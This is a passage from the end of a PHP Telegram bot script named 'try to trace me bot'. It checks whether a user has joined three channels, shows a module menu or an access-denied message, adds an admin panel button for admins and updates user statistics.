        $j1=checkJoin($cb_chat_id,$channel1);$j2=checkJoin($cb_chat_id,$channel2);$j3=checkJoin($cb_chat_id,$channel3);
        acb($cb_id,"🏠");
        dm($cb_chat_id,$cb_msg_id);
        
        if($j1 && $j2 && $j3){
            $msg="⚡ *try to trace me bot* ⚡\n━━━━━━━━━━━━━━━━━━━━\n\n👤 *{$first_name}*\n🎯 _Select a module:_";
            $kb=mainKB();
            if(isAdmin($cb_chat_id)) $kb[]=[['text'=>'🔧 Admin Panel','callback_data'=>'admin_panel']];
            sm($cb_chat_id,$msg,$kb);
        }else{
            sm($cb_chat_id,"🚫 *ACCESS DENIED*\n\n🔒 Join channels:",joinKB());
        }
    }

} // <----- YEH MISSING THI JO ERROR KAR RAHI THI

// Update stats
 $s=ld($statsFile);$s['total_users']=count(ld($usersFile));sd($statsFile,$s);
?>